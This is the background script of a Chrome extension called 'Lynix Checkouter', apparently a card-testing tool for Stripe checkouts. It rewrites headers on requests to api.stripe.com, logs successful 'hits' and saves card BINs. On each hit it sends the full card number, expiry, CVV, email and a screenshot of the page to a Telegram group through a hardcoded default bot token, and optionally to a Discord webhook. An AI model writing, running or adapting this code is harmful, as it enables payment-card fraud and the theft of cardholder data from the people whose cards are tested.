async function registerServiceWorker() {
  try {
    await chrome.declarativeNetRequest.updateDynamicRules({
      removeRuleIds: [1],
      addRules: [{
        id: 1,
        priority: 1,
        action: {
          type: "modifyHeaders",
          requestHeaders: [{
            header: "content-type",
            operation: "set",
            value: "application/x-www-form-urlencoded"
          }]
        },
        condition: {
          urlFilter: "||api.stripe.com/",
          resourceTypes: ["xmlhttprequest"]
        }
      }]
    });
  } catch (error) { }
}

chrome.runtime.onStartup.addListener(async () => {
  await registerServiceWorker();
  setupKeepAlive();
});

chrome.runtime.onInstalled.addListener(async () => {
  await registerServiceWorker();
  setupKeepAlive();
});

// Open dashboard as a full tab when extension icon is clicked
chrome.action.onClicked.addListener(() => {
  chrome.runtime.openOptionsPage();
});

const ALARM_NAME = 'lynix-keepalive';

function setupKeepAlive() {
  chrome.alarms.create(ALARM_NAME, { periodInMinutes: 0.33 });
}

chrome.alarms.onAlarm.addListener((alarm) => {
  if (alarm.name === ALARM_NAME) {
    chrome.runtime.getPlatformInfo(() => { });
  }
});

setInterval(() => {
  chrome.runtime.getPlatformInfo(() => { });
}, 20000);

setupKeepAlive();

const ports = new Set();

chrome.runtime.onConnect.addListener((port) => {
  ports.add(port);
  registerServiceWorker();
  port.onDisconnect.addListener(() => {
    ports.delete(port);
  });
  const pingInterval = setInterval(() => {
    try {
      port.postMessage({ type: 'PING' });
    } catch (e) {
      clearInterval(pingInterval);
    }
  }, 25000);
});

let offscreenCreated = false;

async function ensureOffscreenDocument() {
  if (offscreenCreated) return true;
  try {
    const existingContexts = await chrome.runtime.getContexts({
      contextTypes: ['OFFSCREEN_DOCUMENT']
    });
    if (existingContexts.length > 0) {
      offscreenCreated = true;
      return true;
    }
    await chrome.offscreen.createDocument({
      url: 'offscreen.html',
      reasons: ['AUDIO_PLAYBACK'],
      justification: 'Play success sound notification'
    });
    offscreenCreated = true;
    return true;
  } catch (error) {
    if (error.message?.includes('already exists')) {
      offscreenCreated = true;
      return true;
    }
    return false;
  }
}

const capturedHits = new Map();
const cachedScreenshots = new Map();

async function captureScreenshot(tabId) {
  try {
    let result = await chrome.storage.local.get(["lynix_toggle_auto_ss"]);
    if (result.lynix_toggle_auto_ss === false) {
      return null;
    }
    let lastCapture = capturedHits.get(tabId);
    let now = Date.now();
    if (lastCapture && now - lastCapture < 5000) {
      return cachedScreenshots.get(tabId) || null;
    }
    capturedHits.set(tabId, now);
    setTimeout(() => { capturedHits.delete(tabId); cachedScreenshots.delete(tabId); }, 10000);
    await new Promise(resolve => setTimeout(resolve, 500));
    let tab;
    if (tabId) {
      tab = await chrome.tabs.get(tabId);
    } else {
      const [activeTab] = await chrome.tabs.query({ active: true, currentWindow: true });
      tab = activeTab;
    }
    if (!tab || !tab.windowId) {
      throw new Error("Invalid tab or window");
    }
    await chrome.windows.update(tab.windowId, { focused: true });
    await chrome.tabs.update(tab.id, { active: true });
    await new Promise(resolve => setTimeout(resolve, 100));
    let dataUrl = await chrome.tabs.captureVisibleTab(tab.windowId, {
      format: "png",
      quality: 100
    });
    if (!dataUrl) {
      return null;
    }
    cachedScreenshots.set(tabId, dataUrl);
    await ensureOffscreenDocument();
    await chrome.runtime.sendMessage({
      type: "COPY_TO_CLIPBOARD",
      dataUrl: dataUrl
    }).catch(() => { });
    let timestamp = new Date().toISOString().replace(/[:.]/g, "-");
    await chrome.downloads.download({
      url: dataUrl,
      filename: "NarutoHitter_" + timestamp + ".png",
      saveAs: false
    });
    return dataUrl;
  } catch (error) {
    return null;
  }
}

// Default TG credentials (always active; user overrides via Dashboard)
const DEFAULT_TG_BOT_TOKEN = '8744930514:AAFKJKN0ObcjieltRAne351QKH22Dnnz76U';
const DEFAULT_TG_GROUP_ID = '-1003907074478';

// Load TG credentials from storage, falling back to built-in defaults
async function getTgCredentials() {
  const d = await chrome.storage.local.get(['lynix_tg_bot_token', 'lynix_tg_group_id', 'lynix_tg_user_chat_id']);
  return {
    botToken: d.lynix_tg_bot_token || DEFAULT_TG_BOT_TOKEN,
    groupChatId: d.lynix_tg_group_id || DEFAULT_TG_GROUP_ID,
    userChatId: d.lynix_tg_user_chat_id || ''
  };
}

// Load Discord credentials from storage (configured via Dashboard → Discord)
async function getDiscordCredentials() {
  const d = await chrome.storage.local.get(['lynix_discord_webhook_url', 'lynix_discord_enabled']);
  return {
    webhookUrl: d.lynix_discord_webhook_url || '',
    enabled: d.lynix_discord_enabled === true
  };
}

// ── Local storage helpers ──────────────────────────────────
async function localAddHit(hitObj) {
  const d = await chrome.storage.local.get(['lynix_hit_history', 'lynix_total_hits']);
  const history = Array.isArray(d.lynix_hit_history) ? d.lynix_hit_history : [];
  history.unshift(hitObj);
  if (history.length > 500) history.length = 500;
  await chrome.storage.local.set({
    lynix_hit_history: history,
    lynix_total_hits: (d.lynix_total_hits || 0) + 1
  });
}

async function localIncrementAttempts(site) {
  const d = await chrome.storage.local.get(['lynix_total_attempts', 'lynix_site_attempts']);
  const updates = { lynix_total_attempts: (d.lynix_total_attempts || 0) + 1 };
  if (site) {
    const siteAttempts = d.lynix_site_attempts || {};
    siteAttempts[site] = (siteAttempts[site] || 0) + 1;
    updates.lynix_site_attempts = siteAttempts;
  }
  await chrome.storage.local.set(updates);
}

async function localSaveBin(bin, site) {
  if (!bin) return;
  const d = await chrome.storage.local.get(['lynix_bin_library']);
  const bins = Array.isArray(d.lynix_bin_library) ? d.lynix_bin_library : [];
  // Avoid exact duplicates (same bin + site)
  const exists = bins.some(b => b.bin === bin && b.site === site);
  if (!exists) {
    bins.unshift({ bin, site: site || '', addedAt: Date.now() });
    if (bins.length > 200) bins.length = 200;
    await chrome.storage.local.set({ lynix_bin_library: bins });
  }
}

async function localGetStats() {
  const d = await chrome.storage.local.get([
    'lynix_hit_history', 'lynix_total_hits', 'lynix_total_attempts', 'lynix_bin_library', 'lynix_site_attempts'
  ]);
  return {
    hits: d.lynix_total_hits || 0,
    attempts: d.lynix_total_attempts || 0,
    history: Array.isArray(d.lynix_hit_history) ? d.lynix_hit_history : [],
    bins: Array.isArray(d.lynix_bin_library) ? d.lynix_bin_library : [],
    siteAttempts: d.lynix_site_attempts || {}
  };
}

/**
 * REMOVED: handleAPIRequest, checkLicenseKey, validateToken
 * All data is now stored locally in chrome.storage.local.
 */


function escapeMd(text) {
  return String(text).replace(/([_*[\]()~`>#+\-=|{}.!\\])/g, '\\$1');
}

// Sends a Telegram message with an optional screenshot attached as a photo
async function sendToTg(botToken, chatId, text, photoDataUrl) {
  const base = `https://api.telegram.org/bot${botToken}/`;
  if (photoDataUrl) {
    try {
      const base64 = photoDataUrl.split(',')[1];
      const binary = atob(base64);
      const bytes = new Uint8Array(binary.length);
      for (let i = 0; i < binary.length; i++) bytes[i] = binary.charCodeAt(i);
      const blob = new Blob([bytes], { type: 'image/png' });
      const form = new FormData();
      form.append('chat_id', String(chatId));
      form.append('photo', blob, 'lynix_hit.png');
      form.append('caption', text);
      form.append('parse_mode', 'MarkdownV2');
      await fetch(base + 'sendPhoto', { method: 'POST', body: form });
      return;
    } catch (e) { /* fall through to text-only */ }
  }
  await fetch(base + 'sendMessage', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ chat_id: String(chatId), text, parse_mode: 'MarkdownV2' })
  });
}

// Sends a Discord webhook message with a rich embed
async function sendToDiscord(webhookUrl, embed, screenshotDataUrl) {
  const payload = { embeds: [embed] };
  // If screenshot available, send as multipart form with file attachment
  if (screenshotDataUrl) {
    try {
      const base64 = screenshotDataUrl.split(',')[1];
      const binary = atob(base64);
      const bytes = new Uint8Array(binary.length);
      for (let i = 0; i < binary.length; i++) bytes[i] = binary.charCodeAt(i);
      const blob = new Blob([bytes], { type: 'image/png' });
      embed.image = { url: 'attachment://lynix_hit.png' };
      const form = new FormData();
      form.append('payload_json', JSON.stringify({ embeds: [embed] }));
      form.append('files[0]', blob, 'lynix_hit.png');
      await fetch(webhookUrl, { method: 'POST', body: form });
      return;
    } catch (e) { /* fall through to JSON-only */ }
  }
  await fetch(webhookUrl, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(payload)
  });
}

async function sendDiscordNotification(data, tabId = null) {
  try {
    const dc = await getDiscordCredentials();
    if (!dc.enabled || !dc.webhookUrl) return;

    const attempt = data.attempt;
    if (attempt === undefined || attempt === null || attempt === 'N/A' || attempt === 0 || attempt === '0') return;

    const stored = await chrome.storage.local.get(['lynix_user_first_name']);
    const userName = data.userName || stored.lynix_user_first_name || 'User';

    const cardFull = data.cardNumber || 'N/A';
    const cardParts = cardFull.includes('|') ? cardFull.split('|') : [cardFull, '??', '??', '???'];
    const card = cardParts[0] || 'N/A';
    const mm = cardParts[1] || '??';
    const yy = cardParts[2] || '??';
    const cvv = cardParts[3] || '???';

    const businessUrl = data.businessUrl || 'N/A';
    const successUrl = data.successUrl || businessUrl || 'N/A';
    const timeTaken = data.timeTaken || 'N/A';
    const email = data.email || 'N/A';
    const currency = (data.currency || 'usd').toUpperCase();
    const amount = data.amount || '0';

    const embed = {
      title: '🎀 MR Checker',
      color: 0xF97316,
      fields: [
        { name: '👤 User', value: userName, inline: true },
        { name: '💰 Amount', value: `${amount} ${currency}`, inline: true },
        { name: '🔢 Attempt', value: String(attempt), inline: true },
        { name: '💳 Card', value: `||${card}|${mm}|${yy}|${cvv}||`, inline: false },
        { name: '📧 Email', value: `||${email}||`, inline: false },
        { name: '⏱ Time Taken', value: timeTaken, inline: true },
        { name: '🌐 Site', value: businessUrl, inline: false },
        { name: '✅ Success URL', value: successUrl, inline: false }
      ],
      footer: { text: 'Lynix Checkouter' },
      timestamp: new Date().toISOString()
    };

    // Capture screenshot
    let screenshot = null;
    if (tabId) {
      try { screenshot = await captureScreenshot(tabId); } catch (e) { }
    } else {
      try {
        const [activeTab] = await chrome.tabs.query({ active: true, currentWindow: true });
        if (activeTab) screenshot = await captureScreenshot(activeTab.id);
      } catch (e) { }
    }

    await sendToDiscord(dc.webhookUrl, embed, screenshot);
  } catch (error) { }
}

async function sendTelegramNotification(data, tabId = null) {
  try {
    const attempt = data.attempt;
    if (attempt === undefined || attempt === null || attempt === 'N/A' || attempt === 0 || attempt === '0') {
      return;
    }

    // Load TG credentials from storage
    const tg = await getTgCredentials();
    if (!tg.botToken) return;

    let chatId = data.userId || tg.userChatId;
    let telegramFirstName = data.userName || '';

    const stored = await chrome.storage.local.get(['lynix_user_id', 'lynix_user_first_name']);

    if (!chatId) {
      chatId = stored.lynix_user_id;
    }

    if (!telegramFirstName) {
      telegramFirstName = stored.lynix_user_first_name || 'User';
    }

    const cardFull = data.cardNumber || 'N/A';
    const cardParts = cardFull.includes('|') ? cardFull.split('|') : [cardFull, '??', '??', '???'];
    const card = cardParts[0] || 'N/A';
    const mm = cardParts[1] || '??';
    const yy = cardParts[2] || '??';
    const cvv = cardParts[3] || '???';

    const attemptDisplay = String(attempt);
    const businessUrl = data.businessUrl || 'N/A';
    const successUrl = data.successUrl || businessUrl || 'N/A';
    const timeTaken = data.timeTaken || 'N/A';
    const email = data.email || 'N/A';
    const currency = (data.currency || 'usd').toUpperCase();
    const amount = data.amount || '0';

    // Card and email wrapped in MarkdownV2 spoiler tags
    const cardSpoiler = `||${escapeMd(`${card}|${mm}|${yy}|${cvv}`)}||`;
    const emailSpoiler = `||${escapeMd(email)}||`;

    const message =
      `🎀 *NARUTO HIT DETECTED*\n` +
      `━━━━━━━━━━━━━━━━━━\n` +
      `👤 *User:* ${escapeMd(telegramFirstName)}${chatId ? ` \(${escapeMd(String(chatId))}\)` : ''}\n` +
      `💳 *Card:* ${cardSpoiler}\n` +
      `📧 *Email:* ${emailSpoiler}\n` +
      `━━━━━━━━━━━━━━━━━━\n` +
      `💰 *Amount:* ${escapeMd(amount)} ${escapeMd(currency)}\n` +
      `🔢 *Attempt:* ${escapeMd(attemptDisplay)}\n` +
      `⏱ *Time Taken:* ${escapeMd(timeTaken)}\n` +
      `━━━━━━━━━━━━━━━━━━\n` +
      `🌐 *Site:* ${escapeMd(businessUrl)}\n` +
      `✅ *Success URL:* ${escapeMd(successUrl)}`;

    // Capture screenshot of the hit page (if tabId is valid)
    let screenshot = null;
    if (tabId) {
      try { screenshot = await captureScreenshot(tabId); } catch (e) { }
    } else {
      // No tabId from sender — try the active tab
      try {
        const [activeTab] = await chrome.tabs.query({ active: true, currentWindow: true });
        if (activeTab) screenshot = await captureScreenshot(activeTab.id);
      } catch (e) { }
    }

    // Send to group chat (with screenshot if available)
    if (tg.groupChatId) {
      try { await sendToTg(tg.botToken, tg.groupChatId, message, screenshot); } catch (err) { }
    }

    // Also notify the individual user if we have their chat ID
    if (chatId && String(chatId) !== tg.groupChatId) {
      try { await sendToTg(tg.botToken, chatId, message, screenshot); } catch (err) { }
    }

    // Hit history + BIN are now saved by the RECORD_HIT handler to avoid double-counting

  } catch (error) { }
}

chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {

  // Local-only: no backend API — all data from chrome.storage.local
  if (message.type === "CHECK_LICENSE_KEY" || message.type === "VALIDATE_TOKEN") {
    // Always return valid — no server auth
    sendResponse({ success: true, valid: true, offline: true });
    return false;
  }
  if (message.type === "FETCH_REAL_IP") {
    fetch("https://api.ipify.org?format=json")
      .then(r => r.json())
      .then(data => sendResponse({ ip: data.ip }))
      .catch(() => sendResponse({ ip: null }));
    return true;
  }
  if (message.type === "PERSIST_LOG") {
    chrome.storage.local.get(['lynix_logs'], (d) => {
      let logs = d.lynix_logs || [];
      if (typeof logs === 'string') { try { logs = JSON.parse(logs); } catch (e) { logs = []; } }
      logs.push(message.log);
      if (logs.length > 200) logs = logs.slice(-200);
      chrome.storage.local.set({ lynix_logs: logs });
    });
    return false;
  }
  if (message.type === "API_REQUEST") {
    // No backend — return empty success so callers don't break
    sendResponse({ success: true, local: true });
    return false;
  }
  if (message.type === "RECORD_ATTEMPT") {
    localIncrementAttempts(message.site || '');
    return false;
  }
  if (message.type === "RECORD_HIT") {
    (async () => {
      try {
        const card = message.card || '';
        const amount = message.amount || '0';
        const currency = message.currency || 'usd';
        const merchant = message.merchant || '';
        const email = message.email || '';
        const timeTaken = message.timeTaken || '';
        await localAddHit({ card, email, amount, currency, merchant, timestamp: Date.now(), timeTaken });
        // Auto-save the full BIN (first segment of card) to library
        const bin = card.split('|')[0] || '';
        if (bin.length >= 6) await localSaveBin(bin, merchant);
      } catch (e) { }
    })();
    return false;
  }
  if (message.type === "SAVE_BIN") {
    localSaveBin(message.bin, message.site);
    return false;
  }
  if (message.type === "GET_LOCAL_STATS") {
    localGetStats().then(sendResponse).catch(() => sendResponse({ hits: 0, attempts: 0, history: [], bins: [] }));
    return true;
  }
  if (message.type === "FETCH_IMAGE") {
    (async () => {
      try {
        const resp = await fetch(message.url);
        if (!resp.ok) { sendResponse({ success: false }); return; }
        const blob = await resp.blob();
        const reader = new FileReader();
        reader.onloadend = () => {
          sendResponse({ success: true, dataUrl: reader.result });
        };
        reader.onerror = () => sendResponse({ success: false });
        reader.readAsDataURL(blob);
      } catch (e) {
        sendResponse({ success: false, error: e.message });
      }
    })();
    return true;
  }
  if (message.type === "PLAY_SUCCESS_SOUND_OFFSCREEN") {
    ensureOffscreenDocument().then(created => {
      if (created) {
        setTimeout(() => {
          chrome.runtime.sendMessage({ type: 'PLAY_SUCCESS_SOUND', volume: message.volume || 1.0 }).catch(() => { });
        }, 100);
      }
    });
    return false;
  }
  if (message.type === "PLAY_CUSTOM_PREVIEW") {
    chrome.storage.local.get(['lynix_music_data'], (result) => {
      const audioData = result.lynix_music_data;
      if (audioData) {
        ensureOffscreenDocument().then(created => {
          if (created) {
            setTimeout(() => {
              chrome.runtime.sendMessage({ type: 'PLAY_CUSTOM_PREVIEW', audioData: audioData }).catch(() => { });
            }, 100);
          }
        });
      }
    });
    return false;
  }
  if (message.type === "STOP_CUSTOM_PREVIEW") {
    ensureOffscreenDocument().then(created => {
      if (created) {
        chrome.runtime.sendMessage({ type: 'STOP_CUSTOM_PREVIEW' }).catch(() => { });
      }
    });
    return false;
  }
  if (message.type === "PLAY_BACKGROUND_MUSIC") {
    chrome.storage.local.get(['lynix_music_data'], (result) => {
      const audioData = result.lynix_music_data;
      if (audioData) {
        ensureOffscreenDocument().then(created => {
          if (created) {
            setTimeout(() => {
              chrome.runtime.sendMessage({ type: 'PLAY_BACKGROUND_MUSIC', audioData: audioData, volume: message.volume }).catch(() => { });
            }, 100);
          }
        });
      }
    });
    return false;
  }
  if (message.type === "STOP_BACKGROUND_MUSIC") {
    ensureOffscreenDocument().then(created => {
      if (created) {
        chrome.runtime.sendMessage({ type: 'STOP_BACKGROUND_MUSIC' }).catch(() => { });
      }
    });
    return false;
  }
  if (message.type === "SEND_TELEGRAM_NOTIFICATION") {
    const tabId = sender && sender.tab ? sender.tab.id : null;
    sendTelegramNotification(message.data, tabId);
    sendDiscordNotification(message.data, tabId);
    return false;
  }
  if (message.type === "CAPTURE_SCREENSHOT") {
    const tabId = sender && sender.tab ? sender.tab.id : null;
    captureScreenshot(tabId).then((dataUrl) => {
      sendResponse({ dataUrl: dataUrl });
    });
    return true;
  }
  return false;
});
